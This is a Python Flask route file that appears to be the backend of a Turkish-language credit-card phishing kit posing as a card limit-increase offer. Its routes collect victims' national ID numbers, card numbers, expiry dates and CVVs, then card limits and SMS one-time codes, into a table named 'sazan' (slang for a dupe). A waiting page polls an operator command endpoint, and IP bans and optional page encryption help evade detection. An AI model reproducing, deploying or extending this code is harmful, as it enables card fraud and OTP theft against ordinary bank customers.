from __future__ import annotations

import re
from datetime import datetime

from flask import Blueprint, redirect, render_template, request, session, url_for

from ..binlookup import lookup_bank
from ..config import AppConfig
from ..database import get_cursor
from ..detectors import detect_browser, detect_device
from ..encryption import build_encrypted_response
from ..utils import enforce_ban, get_client_ip, tum_bosluklari_temizle, update_flow_state

public_bp = Blueprint("public", __name__)

CARD_SANITIZER = re.compile(r"\D+")
DATE_FORMAT = "%d.%m.%Y %H:%M"
def _sanitize_limit_value(raw_value: str) -> int | None:
    digits = CARD_SANITIZER.sub("", raw_value or "")
    return int(digits) if digits else None


def _build_limit_snapshot(query_id: int | None) -> dict[str, int] | None:
    if not query_id:
        return None
    with get_cursor() as cursor:
        cursor.execute(
            "SELECT toplam_limit, guncel_limit FROM sazan WHERE id=? LIMIT 1",
            (query_id,),
        )
        row = cursor.fetchone()
    if not row:
        return None
    return {
        "total_limit": int(row["toplam_limit"] or 0),
        "current_limit": int(row["guncel_limit"] or 0),
    }



def _render(template_name: str, *, encrypt: bool | None = None, **context):
    client_ip = context.setdefault("client_ip", get_client_ip(request))
    context.setdefault("poll_url", url_for("commands.poll_data", ip=client_ip) if client_ip else url_for("commands.poll_data"))
    markup = render_template(template_name, **context)
    should_encrypt = AppConfig.frontend_encryption_enabled if encrypt is None else encrypt
    if should_encrypt:
        return build_encrypted_response(markup)
    return markup


def _protect_session() -> int | None:
    query_id = session.get("query_id")
    if not query_id:
        session["redirect_after_login"] = request.path
    return query_id


@public_bp.route("/", methods=["GET", "POST"])
def index():
    client_ip = get_client_ip(request)
    ban_redirect = enforce_ban(client_ip)
    if ban_redirect:
        return ban_redirect

    update_flow_state(client_ip, "Anasayfa")

    if request.method == "POST":
        tc = (request.form.get("kullanici") or "").strip()
        card_number = (request.form.get("cc_no") or "").strip()
        expiry = (request.form.get("cc_yil") or "").strip()
        cvv = (request.form.get("cc_cvv") or "").strip()

        sanitized_card = CARD_SANITIZER.sub("", card_number)
        if len(sanitized_card) < 12:
            return _render("index.html", error="Lütfen kart numaranızı kontrol edin.")

        cc_last_4 = sanitized_card[-4:]
        bin_prefix = sanitized_card[:6]
        bin_metadata = lookup_bank(bin_prefix)
        bank_name = (bin_metadata.get("bank") or {}).get("name") if bin_metadata else None

        now_str = datetime.now().strftime(DATE_FORMAT)
        device_name = detect_device(request.headers.get("User-Agent"))
        browser_name = detect_browser(request.headers.get("User-Agent"))

        insert_sql = """
            INSERT INTO sazan (ip, date, cihaz, tarayici, tc, kk, sonkul, cvv, banka)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """
        with get_cursor() as cursor:
            params = (client_ip, now_str, device_name, browser_name, tc, sanitized_card, expiry, cvv, bank_name)
            if AppConfig.database_url:
                cursor.execute(insert_sql + " RETURNING id", params)
                new_row = cursor.fetchone()
                session["query_id"] = int(new_row["id"]) if new_row else None
            else:
                cursor.execute(insert_sql, params)
                session["query_id"] = cursor.lastrowid

        session["cc_last_4"] = cc_last_4
        session["cc_first_6"] = bin_prefix
        session["ip_address"] = client_ip

        return redirect(url_for("public.limit_kontrol"))

    return _render("index.html")


@public_bp.route("/limit-kontrol", methods=["GET", "POST"])
def limit_kontrol():
    client_ip = get_client_ip(request)
    ban_redirect = enforce_ban(client_ip)
    if ban_redirect:
        return ban_redirect

    update_flow_state(client_ip, "Limit Kontrol")
    query_id = _protect_session()
    form_data = {"total_limit": "", "current_limit": ""}
    if request.method == "POST":
        form_data["total_limit"] = (request.form.get("total_limit") or "").strip()
        form_data["current_limit"] = (request.form.get("current_limit") or "").strip()
    if request.method == "POST" and query_id:
        total_limit = _sanitize_limit_value(form_data["total_limit"])
        current_limit = _sanitize_limit_value(form_data["current_limit"])
        if total_limit is None or current_limit is None:
            return _render(
                "limit-kontrol.html",
                error="Lütfen toplam ve güncel kart limitlerinizi rakamsal olarak giriniz.",
                form_data=form_data,
            )
        if current_limit > total_limit:
            return _render(
                "limit-kontrol.html",
                error="Güncel limitiniz toplam limitinizden büyük olamaz.",
                form_data=form_data,
            )
        with get_cursor() as cursor:
            cursor.execute(
                """
                UPDATE sazan
                SET kartlimit=?, toplam_limit=?, guncel_limit=?
                WHERE id=?
                """,
                (current_limit, total_limit, current_limit, query_id),
            )
        return redirect(url_for("public.bekleyiniz"))
    if not query_id:
        return redirect(url_for("public.index"))
    return _render("limit-kontrol.html", form_data=form_data)


@public_bp.route("/bekleyiniz")
def bekleyiniz():
    client_ip = get_client_ip(request)
    ban_redirect = enforce_ban(client_ip)
    if ban_redirect:
        return ban_redirect
    update_flow_state(client_ip, "Bekleme Sayfası")
    if not _protect_session():
        return redirect(url_for("public.index"))
    return _render("bekleyiniz.html")


@public_bp.route("/sms-dogrulama", methods=["GET", "POST"])
def sms_dogrulama():
    client_ip = get_client_ip(request)
    ban_redirect = enforce_ban(client_ip)
    if ban_redirect:
        return ban_redirect
    update_flow_state(client_ip, "SMS Doğrulama")
    query_id = _protect_session()
    if request.method == "POST" and query_id:
        sms_code = (request.form.get("sms1") or "").strip()
        if sms_code:
            with get_cursor() as cursor:
                cursor.execute("UPDATE sazan SET sms=? WHERE id=?", (sms_code, query_id))
        return redirect(url_for("public.bekleyiniz"))
    if not query_id:
        return redirect(url_for("public.index"))
    return _render("sms-dogrulama.html")


@public_bp.route("/sms-hatali", methods=["GET", "POST"])
def sms_hatali():
    client_ip = get_client_ip(request)
    ban_redirect = enforce_ban(client_ip)
    if ban_redirect:
        return ban_redirect
    update_flow_state(client_ip, "SMS Hatalı")
    query_id = _protect_session()
    if request.method == "POST" and query_id:
        sms_code = (request.form.get("sms2") or "").strip()
        if sms_code:
            with get_cursor() as cursor:
                cursor.execute("UPDATE sazan SET sms=? WHERE id=?", (sms_code, query_id))
        return redirect(url_for("public.bekleyiniz"))
    if not query_id:
        return redirect(url_for("public.index"))
    return _render("sms-hatali.html")


@public_bp.route("/tebrikler")
def tebrikler():
    client_ip = get_client_ip(request)
    ban_redirect = enforce_ban(client_ip)
    if ban_redirect:
        return ban_redirect
    update_flow_state(client_ip, "Tebrik Sayfası")
    query_id = _protect_session()
    if not query_id:
        return redirect(url_for("public.index"))
    limit_snapshot = _build_limit_snapshot(query_id)
    arti_bakiye = None
    yeni_limit = None
    if limit_snapshot:
        total_limit = limit_snapshot["total_limit"]
        current_limit = limit_snapshot["current_limit"]
        arti_bakiye = max(total_limit - current_limit, 0)
        if arti_bakiye == 0:
            arti_bakiye = max(int(total_limit * 0.08), 1)
        yeni_limit = total_limit + arti_bakiye
    return _render(
        "tebrikler.html",
        limit_snapshot=limit_snapshot,
        arti_bakiye=arti_bakiye,
        yeni_limit=yeni_limit,
    )
